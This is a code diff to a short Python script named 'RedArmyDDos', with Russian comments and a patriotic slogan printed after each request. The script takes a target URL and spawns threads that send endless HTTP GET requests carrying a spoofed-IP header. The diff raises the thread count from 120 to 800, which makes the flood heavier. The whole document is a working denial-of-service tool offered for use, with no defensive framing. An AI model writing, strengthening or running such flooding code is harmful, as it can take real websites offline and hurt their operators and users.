@@ -5,17 +5,13 @@ import random
 #настройки
 FakeIp = '92.223.109.96'
 
-user = [
-	FakeIp
-]
+user = [FakeIp]
 
-headers = {
-	'0': random.choice(user)
-}
+headers = {'0': random.choice(user)}
 
 #работа
-print('RedArmiDDos')
-adres = str(input('url:'))
+print('RedArmyDDos')
+adres = str(input('link:'))
 def send():
 	while True:
 		requests.get(adres, headers=headers)
@@ -27,6 +23,6 @@ def send():
 		print('Красная армия всех сильней!')
 
 if __name__ == '__main__':
-	for i in range(120):
+	for i in range(800):
 		thr = Thread(target=send)
 		thr.start()
